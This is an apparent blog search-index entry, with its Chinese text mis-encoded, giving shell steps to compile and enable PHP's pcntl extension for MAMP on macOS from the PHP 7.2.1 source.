        <content type="html"><![CDATA[<p>åœ¨ Mac ä¸‹åš PHP å¼€å‘ç”¨çš„æ˜¯ MAMP é›†æˆå¼€å‘ç¯å¢ƒï¼Œå‡ºç° PHP ä¸æ”¯æŒ pcntl æ‰©å±•ï¼ŒæŸ¥ä¸‹è°·æ­Œå‘ç° MAMP çš„é›†æˆç¯å¢ƒæ˜¯æ²¡æœ‰è¿™ä¸ªæ‰©å±•åŒ…çš„ï¼Œéœ€è¦æ‰‹åŠ¨ç¼–è¯‘å®‰è£…è¿™ä¸ªåŒ…ã€‚</p><h3 id="å…·ä½“æ­¥éª¤"><a href="#å…·ä½“æ­¥éª¤" class="headerlink" title="å…·ä½“æ­¥éª¤"></a>å…·ä½“æ­¥éª¤</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ä¸‹è½½æºç åŒ…</span></span><br><span class="line">wget http://cn.php.net/distributions/php-7.2.1.tar.gz</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> è§£å‹</span></span><br><span class="line">tar zxvf php-7.2.1.tar.gz</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> è¿›å…¥æ–‡ä»¶æ‰§è¡Œç¼–è¯‘</span></span><br><span class="line">cd php-7.2.1/ext/pcntl</span><br><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ‹·è´ç¼–è¯‘.soæ–‡ä»¶åˆ°MAMP extensionsç›®å½•(å…·ä½“çš„æ–‡ä»¶å¤¹çœ‹è‡ªå·±çš„ç›®å½•å“¦)</span></span><br><span class="line">cp modules/pcntl.so /Applications/MAMP/bin/php/php7.2.1/lib/php/extensions/no-debug-non-zts-20170718</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ç¼–è¾‘php.iniå¼•å…¥æ‰©å±•</span></span><br><span class="line">echo &quot;extension=pcntl.so&quot; &gt;&gt; /Applications/MAMP/bin/php/php7.2.1/conf/php.ini</span><br></pre></td></tr></table></figure><h3 id="æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ"><a href="#æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ" class="headerlink" title="æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ"></a>æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">php --ri pcntl</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> mac </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
